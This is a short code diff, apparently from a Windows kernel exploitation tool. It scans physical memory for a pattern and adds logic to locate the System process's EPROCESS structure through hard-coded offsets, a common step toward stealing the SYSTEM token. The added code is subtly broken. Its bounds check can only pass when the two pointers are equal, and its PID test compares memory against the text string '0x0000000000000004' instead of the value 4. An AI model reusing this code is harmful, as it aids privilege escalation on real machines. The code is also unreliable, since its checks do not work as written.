@@ -149,8 +149,19 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 				castedBuf = (unsigned char*)castedBuf + 1;
 				if (memcmp(castedBuf, pattern, patternLength) == 0)
 				{
-					locations.push_back(page + offset);
-					printf("\nFound pattern at: %p\n", (void*)(page + offset));
+					unsigned __int64 patternLocation = page + offset;
+					unsigned char* EPROCESSBaseOfSystem = (unsigned char*)castedBuf - 0x5A7;
+					unsigned char* UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+					// check buf bounds
+					if ((unsigned __int64)buf <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)buf)
+					{
+						if (memcmp(UniqueProcessId, "0x0000000000000004", 8) == 0)
+						{
+							// PID of System is 4
+							locations.push_back(patternLocation);
+							printf("\nFound pattern at: %p\n", (void*)(page + offset));
+						}
+					}
 				}
 			}
 			if (UnmapPhysicalMemory(buf) == FALSE) {
